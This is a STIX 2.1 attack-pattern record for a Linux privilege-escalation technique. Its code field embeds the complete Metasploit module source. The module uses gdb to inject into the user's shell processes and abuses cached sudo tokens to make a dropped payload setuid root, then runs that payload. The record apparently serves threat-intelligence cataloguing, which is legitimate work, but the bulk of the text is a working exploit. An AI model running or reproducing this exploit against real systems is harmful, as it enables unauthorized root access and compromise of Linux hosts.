{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bff6d345-e095-4725-bce7-96cedf7d2227",
    "created": "2024-08-14T16:58:53.464814Z",
    "modified": "2024-08-14T16:58:53.464819Z",
    "name": "ptrace Sudo Token Privilege Escalation",
    "description": " This module attempts to gain root privileges by blindly injecting into the session user's running shell processes and executing commands by calling `system()`, in the hope that the process has valid cached sudo tokens with root privileges.  The system must have gdb installed and permit ptrace.  This module has been tested successfully on:  Debian 9.8 (x64); and CentOS 7.4.1708 (x64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/ptrace_sudo_token_priv_esc.rb",
            "external_id": "ptrace_sudo_token_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/nongiach/sudo_inject"
        },
        {
            "source_name": "reference",
            "url": "https://www.kernel.org/doc/Documentation/security/Yama.txt"
        },
        {
            "source_name": "reference",
            "url": "http://man7.org/linux/man-pages/man2/ptrace.2.html"
        },
        {
            "source_name": "reference",
            "url": "https://lwn.net/Articles/393012/"
        },
        {
            "source_name": "reference",
            "url": "https://lwn.net/Articles/492667/"
        },
        {
            "source_name": "reference",
            "url": "https://linux-audit.com/protect-ptrace-processes-kernel-yama-ptrace_scope/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Process\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ptrace Sudo Token Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges by blindly injecting into\n          the session user's running shell processes and executing commands by\n          calling `system()`, in the hope that the process has valid cached sudo\n          tokens with root privileges.\n\n          The system must have gdb installed and permit ptrace.\n\n          This module has been tested successfully on:\n\n          Debian 9.8 (x64); and\n          CentOS 7.4.1708 (x64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'chaignc', # sudo_inject\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2019-03-24',\n        'References' => [\n          ['EDB', '46989'],\n          ['URL', 'https://github.com/nongiach/sudo_inject'],\n          ['URL', 'https://www.kernel.org/doc/Documentation/security/Yama.txt'],\n          ['URL', 'http://man7.org/linux/man-pages/man2/ptrace.2.html'],\n          ['URL', 'https://lwn.net/Articles/393012/'],\n          ['URL', 'https://lwn.net/Articles/492667/'],\n          ['URL', 'https://linux-audit.com/protect-ptrace-processes-kernel-yama-ptrace_scope/'],\n          ['URL', 'https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html']\n        ],\n        'Platform' => ['linux'],\n        'Arch' => [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Targets' => [['Auto', {}]],\n        'DefaultOptions' => {\n          'PrependSetresuid' => true,\n          'PrependSetresgid' => true,\n          'PrependFork' => true,\n          'WfsDelay' => 30\n        },\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n    register_options [\n      OptInt.new('TIMEOUT', [true, 'Process injection timeout (seconds)', '30'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def timeout\n    datastore['TIMEOUT']\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def check\n    if yama_enabled?\n      vprint_error 'YAMA ptrace scope is restrictive'\n      return CheckCode::Safe\n    end\n    vprint_good 'YAMA ptrace scope is not restrictive'\n\n    if command_exists? '/usr/sbin/getsebool'\n      if cmd_exec(\"/usr/sbin/getsebool deny_ptrace 2>1 | /bin/grep -q on && echo true\").to_s.include? 'true'\n        vprint_error 'SELinux deny_ptrace is enabled'\n        return CheckCode::Safe\n      end\n      vprint_good 'SELinux deny_ptrace is disabled'\n    end\n\n    unless command_exists? 'sudo'\n      vprint_error 'sudo is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'sudo is installed'\n\n    unless command_exists? 'gdb'\n      vprint_error 'gdb is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'gdb is installed'\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    if nosuid? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is mounted nosuid\"\n    end\n\n    # Find running shell processes\n    shells = %w[ash ksh csh dash bash zsh tcsh fish sh]\n\n    system_shells = read_file('/etc/shells').to_s.each_line.map { |line|\n      line.strip\n    }.reject { |line|\n      line.starts_with?('#')\n    }.each { |line|\n      shells << line.split('/').last\n    }\n    shells = shells.uniq.reject { |shell| shell.blank? }\n\n    print_status 'Searching for shell processes ...'\n    pids = []\n    if command_exists? 'pgrep'\n      cmd_exec(\"pgrep '^(#{shells.join('|')})$' -u \\\"$(id -u)\\\"\").to_s.each_line do |pid|\n        pids << pid.strip\n      end\n    else\n      shells.each do |s|\n        pidof(s).each { |p| pids << p.strip }\n      end\n    end\n\n    if pids.empty?\n      fail_with Failure::Unknown, 'Found no running shell processes'\n    end\n\n    print_status \"Found #{pids.uniq.length} running shell processes\"\n    vprint_status pids.join(', ')\n\n    # Upload payload\n    @payload_path = \"#{base_dir}/.#{rand_text_alphanumeric 10..15}\"\n    upload @payload_path, generate_payload_exe\n\n    # Blindly call system() in each shell process\n    pids.each do |pid|\n      print_status \"Injecting into process #{pid} ...\"\n\n      cmds = \"echo | sudo -S /bin/chown 0:0 #{@payload_path} >/dev/null 2>&1 && echo | sudo -S /bin/chmod 4755 #{@payload_path} >/dev/null 2>&1\"\n      sudo_inject = \"echo 'call system(\\\"#{cmds}\\\")' | gdb -q -n -p #{pid} >/dev/null 2>&1\"\n      res = cmd_exec sudo_inject, nil, timeout\n      vprint_line res unless res.blank?\n\n      next unless setuid? @payload_path\n\n      print_good \"#{@payload_path} setuid root successfully\"\n      print_status 'Executing payload...'\n      res = cmd_exec \"#{@payload_path} & echo \"\n      vprint_line res\n      return\n    end\n\n    fail_with Failure::NoAccess, 'Failed to create setuid root shell. Session user has no valid cached sudo tokens.'\n  end\n\n  def on_new_session(session)\n    if session.type.eql? 'meterpreter'\n      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n      session.fs.file.rm @payload_path\n    else\n      session.shell_command_token \"rm -f '#{@payload_path}'\"\n    end\n  ensure\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-24",
    "x_mitre_platforms": [
        "['linux']"
    ]
}